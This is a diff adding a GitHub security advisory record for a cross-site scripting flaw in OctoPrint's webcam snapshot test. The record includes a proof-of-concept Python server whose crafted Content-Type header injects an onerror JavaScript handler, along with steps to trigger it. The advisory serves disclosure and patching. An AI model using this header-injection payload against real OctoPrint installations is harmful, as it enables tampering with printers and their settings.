@@ -1,0 +1,68 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-x7mf-wrh9-r76c",
+  "modified": "2024-03-19T18:31:36Z",
+  "published": "2024-03-18T20:29:45Z",
+  "aliases": [
+    "CVE-2024-28237"
+  ],
+  "summary": "XSS via the \"Snapshot Test\" feature in Classic Webcam plugin settings",
+  "details": "### Impact\n\nOctoPrint versions up until and including 1.9.3 contain a vulnerability that allows malicious admins to configure or talk a victim with administrator rights into configuring a webcam snapshot URL which when tested through the \"Test\" button included in the web interface will execute JavaScript code in the victims browser when attempting to render the snapshot image.\n\nAn attacker who successfully talked a victim with admin rights into performing a snapshot test with such a crafted URL could use this to retrieve or modify sensitive configuration settings, interrupt prints or otherwise interact with the OctoPrint instance in a malicious way.\n\n### Patches\n\nThe vulnerability will be patched in version 1.10.0.\n\n### Workaround\n\nOctoPrint administrators are strongly advised to thoroughly vet who has admin access to their installation and what settings they modify based on instructions by strangers.\n\n### PoC\n\nBelow are the steps to reproduce the vulnerability:\n\n1. Create a URL that responds with a malicious content type. For example, creating the following python script:\n   ```\n   from http.server import BaseHTTPRequestHandler, HTTPServer\n\n   class MyHTTPRequestHandler(BaseHTTPRequestHandler):\n       def do_GET(self):\n           self.send_response(200)\n           self.send_header('Content-Type', 'image/\"onerror=\"alert(1)\"')\n           self.end_headers()\n           self.wfile.write(b'Ok')\n\n   def run():\n       server_address = ('', 8080)\n       httpd = HTTPServer(server_address, MyHTTPRequestHandler)\n       print('Server listening on 0.0.0.0:8080...')\n       httpd.serve_forever()\n\n   if __name__ == '__main__':\n       run()\n   ```\n\n2. Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS. A Javascript alert should appear, demonstrating the actual code injection.\n\n### Credits\n\nThis vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "OctoPrint"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.10.0rc3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 1.9.3"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-x7mf-wrh9-r76c"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28237"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/OctoPrint/OctoPrint/commit/779894c1bc6478332d14bc9ed1006df1354eb517"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/OctoPrint/OctoPrint"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-18T20:29:45Z",
+    "nvd_published_at": "2024-03-18T22:15:07Z"
+  }
+}
